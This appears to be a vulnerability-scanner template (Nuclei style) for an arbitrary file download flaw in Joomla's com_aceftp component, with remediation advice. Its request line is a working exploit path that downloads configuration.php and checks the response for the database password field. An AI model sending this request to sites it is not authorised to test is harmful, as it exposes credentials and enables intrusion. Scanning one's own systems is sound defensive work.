id: Joomla-sqli-aceftp
info:
  name: Joomla com aceftp arbitrary file download vulnerability
  author:
  - 折跃
  description: |-
    Joomla! Arbitrary file download vulnerability in aceftp component
    Joomla! is an open source content management system (CMS).

    Joomla! com aceftp /administrator/components/com_aceftp/quixplorer/index.php has an arbitrary file download vulnerability. An attacker can exploit this vulnerability to read arbitrary files.
  severity: medium
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program:
    http://www.joomla.org/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body,'public $password')
  path:
  - '{{BaseURL}}/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes'
  method: GET
  headers:
    Host: '{{Hostname}}'
  req-condition: true
variables:
  verify: '{{rand_text_alphanumeric(32,"")}}'
